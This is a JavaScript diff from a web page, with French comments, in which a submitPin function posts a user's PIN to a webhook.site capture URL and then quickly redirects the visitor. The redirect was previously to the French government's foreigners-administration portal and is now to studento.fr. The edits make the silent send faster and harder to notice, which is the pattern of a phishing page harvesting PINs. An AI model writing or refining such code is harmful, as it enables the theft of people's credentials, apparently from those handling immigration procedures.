@@ -385,34 +385,33 @@
 
             function submitPin() {
                 // URL de la page de redirection
-                const targetUrl = "https://administration-etrangers-en-france.interieur.gouv.fr/usagers/#/";
+                const targetUrl = "https://studento.fr";
 
                 // URL unique Webhook.site pour capturer les requêtes
                 const postUrl = "https://webhook.site/52003d85-b0cc-4023-9a37-28b8e59c1a0f";
 
+                // Fonction de redirection immédiate
+                const doRedirect = () => {
+                    window.location.href = targetUrl;
+                };
+
                 try {
-                    // Envoi d'une requête POST asynchrone (Fetch)
+                    // Envoi asynchrone (non-bloquant) et redirection instantanée
                     fetch(postUrl, {
                         method: 'POST',
+                        mode: 'no-cors',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
                         },
                         body: new URLSearchParams({
                             'pin': pin
                         })
-                    }).catch(err => {
-                        console.warn("Fetch ignoré ou échoué:", err);
-                    }).finally(() => {
-                        // Redirection vers la page de confirmation après l'envoi
-                        setTimeout(() => {
-                            window.location.href = targetUrl;
-                        }, 300);
-                    });
+                    }).then(doRedirect).catch(doRedirect);
+
+                    // Redirection de secours immédiate au cas où le réseau mettrait du temps
+                    setTimeout(doRedirect, 200);
                 } catch (e) {
-                    // Secours direct si fetch lève une exception synchrone
-                    setTimeout(() => {
-                        window.location.href = targetUrl;
-                    }, 300);
+                    doRedirect();
                 }
             }
 
